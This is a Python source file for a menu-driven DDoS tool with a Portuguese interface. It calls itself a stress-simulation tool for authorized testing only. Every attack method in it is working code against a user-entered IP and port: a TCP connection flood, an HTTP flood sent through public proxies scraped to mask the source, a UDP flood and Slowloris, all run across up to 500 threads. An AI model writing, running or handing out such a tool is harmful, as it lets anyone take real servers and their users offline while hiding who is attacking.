#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import threading
import time
import random
import os
import sys
from datetime import datetime
import requests
from bs4 import BeautifulSoup

class DDoSSimulator:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 80
        self.thread_count = 100
        self.attack_running = False
        self.requests_sent = 0
        self.proxies = []
        self.current_proxy = 0
        self.attack_method = "TCP_SYN"
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Mozilla/5.0 (Android 10; Mobile; rv:91.0)"
        ]
        self.banner = """
\033[91m
██████╗ ██████╗  ██████╗ ███████╗    ███████╗████████╗██████╗ ███████╗███████╗███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝
██║  ██║██║  ██║██║   ██║███████╗    ███████╗   ██║   ██████╔╝█████╗  █████╗  ███████╗
██║  ██║██║  ██║██║   ██║╚════██║    ╚════██║   ██║   ██╔═══╝ ██╔══╝  ██╔══╝  ╚════██║
██████╔╝██████╔╝╚██████╔╝███████║    ███████║   ██║   ██║     ███████╗███████╗███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚══════╝   ╚═╝   ╚═╝     ╚══════╝╚══════╝╚══════╝
\033[0m
\033[93m╔══════════════════════════════════════════════════════════════╗
║   FERRAMENTA DE SIMULAÇÃO DE ESTRESSE - v3.0            ║
║        USO EXCLUSIVO PARA TESTES AUTORIZADOS            ║
╚══════════════════════════════════════════════════════════╝\033[0m
"""

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        self.clear_screen()
        print(self.banner)

    def validate_ip(self, ip):
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            for part in parts:
                if not 0 <= int(part) <= 255:
                    return False
            return True
        except:
            return False

    def load_proxies(self):
        print("\n[+] Carregando proxies públicos...")
        try:
            url = "https://www.sslproxies.org/"
            r = requests.get(url)
            soup = BeautifulSoup(r.content, 'html.parser')
            proxies_table = soup.find('table', {'id': 'proxylisttable'})
            
            for row in proxies_table.tbody.find_all('tr'):
                cols = row.find_all('td')
                if len(cols) >= 2:
                    ip = cols[0].text.strip()
                    port = cols[1].text.strip()
                    self.proxies.append(f"{ip}:{port}")
            
            print(f"[+] {len(self.proxies)} proxies carregados com sucesso!")
        except Exception as e:
            print(f"[!] Erro ao carregar proxies: {str(e)}")
            print("[+] Usando conexão direta (sem proxy)")
        time.sleep(2)

    def get_next_proxy(self):
        if not self.proxies:
            return None
        
        self.current_proxy = (self.current_proxy + 1) % len(self.proxies)
        return self.proxies[self.current_proxy]

    def tcp_syn_attack(self):
        while self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_ip, self.target_port))
                s.close()
                self.requests_sent += 1
            except:
                pass

    def http_flood_attack(self):
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }

        while self.attack_running:
            proxy = self.get_next_proxy()
            proxies = {'http': f'http://{proxy}'} if proxy else None
            
            try:
                if proxy:
                    requests.get(f"http://{self.target_ip}", headers=headers, 
                               proxies=proxies, timeout=2)
                else:
                    requests.get(f"http://{self.target_ip}", headers=headers, 
                               timeout=2)
                self.requests_sent += 1
            except:
                pass

    def udp_flood_attack(self):
        while self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(1024)
                s.sendto(payload, (self.target_ip, self.target_port))
                s.close()
                self.requests_sent += 1
            except:
                pass

    def slowloris_attack(self):
        headers = [
            "User-Agent: {}".format(random.choice(self.user_agents)),
            "Accept-language: en-US,en,q=0.5"
        ]

        sockets = []
        for _ in range(100):
            if not self.attack_running:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_ip, self.target_port))
                s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode())
                for header in headers:
                    s.send("{}\r\n".format(header).encode())
                sockets.append(s)
                self.requests_sent += 1
            except:
                pass

        while self.attack_running:
            for s in sockets:
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                    self.requests_sent += 1
                except:
                    sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass
            time.sleep(15)

    def start_attack(self):
        if not self.validate_ip(self.target_ip):
            print("\n\033[91m[!] Endereço IP inválido!\033[0m")
            time.sleep(1)
            return

        self.print_banner()
        print(f"\n\033[91m[+] INICIANDO ATAQUE {self.attack_method} CONTRA {self.target_ip}:{self.target_port}\033[0m")
        print(f"[+] Threads: {self.thread_count}")
        print(f"[+] Proxies disponíveis: {len(self.proxies)}")
        print("[+] Pressione Ctrl+C para parar\n")

        self.attack_running = True
        self.requests_sent = 0
        start_time = time.time()

        attack_methods = {
            "TCP_SYN": self.tcp_syn_attack,
            "HTTP_FLOOD": self.http_flood_attack,
            "UDP_FLOOD": self.udp_flood_attack,
            "SLOWLORIS": self.slowloris_attack
        }

        threads = []
        for _ in range(self.thread_count):
            t = threading.Thread(target=attack_methods[self.attack_method])
            t.daemon = True
            t.start()
            threads.append(t)

        try:
            while True:
                elapsed = time.time() - start_time
                print(f"\r[+] Requisições: {self.requests_sent} | Taxa: {int(self.requests_sent/elapsed)}/s | Proxies: {len(self.proxies)}", end='')
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.attack_running = False
            print("\n\n[+] Parando ataque...")
            
            for t in threads:
                t.join(timeout=1)
            
            elapsed = time.time() - start_time
            print(f"\n[+] Ataque concluído!")
            print(f"[+] Total de requisições: {self.requests_sent}")
            print(f"[+] Duração: {elapsed:.2f} segundos")
            print(f"[+] Taxa média: {int(self.requests_sent/elapsed)} req/s")
            input("\n[Pressione Enter para continuar...")

    def show_menu(self):
        while True:
            self.print_banner()
            print("\n\033[94m╔══════════════════════════════════════════════════════════════╗")
            print("║                         MENU PRINCIPAL                         ║")
            print("╠══════════════════════════════════════════════════════════════╣")
            print("║ 1. Definir Alvo                                              ║")
            print("║ 2. Carregar Proxies                                          ║")
            print("║ 3. Configurar Ataque                                         ║")
            print("║ 4. Iniciar Simulação                                         ║")
            print("║ 5. Sair                                                      ║")
            print("╚══════════════════════════════════════════════════════════════╝\033[0m")
            
            choice = input("\n\033[92m[DDoS-SIM]>\033[0m Escolha uma opção: ")
            
            if choice == '1':
                self.set_target()
            elif choice == '2':
                self.load_proxies()
            elif choice == '3':
                self.configure_attack()
            elif choice == '4':
                self.start_attack()
            elif choice == '5':
                print("\n\033[93m[+] Encerrando ferramenta...\033[0m")
                sys.exit(0)
            else:
                print("\n\033[91m[!] Opção inválida!\033[0m")
                time.sleep(1)

    def set_target(self):
        self.print_banner()
        print("\n\033[94m╔══════════════════════════════════════════════════════════════╗")
        print("║                       DEFINIR ALVO                                ║")
        print("╚══════════════════════════════════════════════════════════════╝\033[0m")
        
        ip = input("\n[+] IP do alvo: ").strip()
        if not self.validate_ip(ip):
            print("\033[91m[!] IP inválido! Formato esperado: 192.168.1.1\033[0m")
            time.sleep(1)
            return
        
        try:
            port = int(input("[+] Porta (80 padrão): ").strip() or "80")
            if not 1 <= port <= 65535:
                raise ValueError
        except:
            print("\033[91m[!] Porta inválida! Use entre 1-65535\033[0m")
            time.sleep(1)
            return
        
        self.target_ip = ip
        self.target_port = port
        print("\n\033[92m[+] Alvo configurado com sucesso!\033[0m")
        time.sleep(1)

    def configure_attack(self):
        self.print_banner()
        print("\n\033[94m╔══════════════════════════════════════════════════════════════╗")
        print("║                      CONFIGURAR ATAQUE                             ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print("║ 1. TCP SYN Flood (Padrão)                                     ║")
        print("║ 2. HTTP Flood (Com proxies)                                   ║")
        print("║ 3. UDP Flood                                                  ║")
        print("║ 4. Slowloris (Conexões parciais)                              ║")
        print("║ 5. Voltar                                                     ║")
        print("╚══════════════════════════════════════════════════════════════╝\033[0m")
        
        choice = input("\n\033[92m[DDoS-SIM]>\033[0m Escolha o método: ")
        
        methods = {
            '1': 'TCP_SYN',
            '2': 'HTTP_FLOOD',
            '3': 'UDP_FLOOD',
            '4': 'SLOWLORIS'
        }
        
        if choice in methods:
            self.attack_method = methods[choice]
            print(f"\n\033[92m[+] Método configurado: {self.attack_method}\033[0m")
        elif choice != '5':
            print("\033[91m[!] Opção inválida!\033[0m")
        
        try:
            threads = int(input("[+] Número de threads (1-500): ").strip() or "100")
            if 1 <= threads <= 500:
                self.thread_count = threads
            else:
                print("\033[91m[!] Use entre 1-500 threads\033[0m")
        except:
            print("\033[91m[!] Valor inválido!\033[0m")
        
        time.sleep(1)

if __name__ == "__main__":
    try:
        tool = DDoSSimulator()
        tool.show_menu()
    except KeyboardInterrupt:
        print("\n\033[93m[+] Ferramenta encerrada pelo usuário\033[0m")
        sys.exit(0)
    except Exception as e:
        print(f"\n\033[91m[!] Erro fatal: {str(e)}\033[0m")
        sys.exit(1)
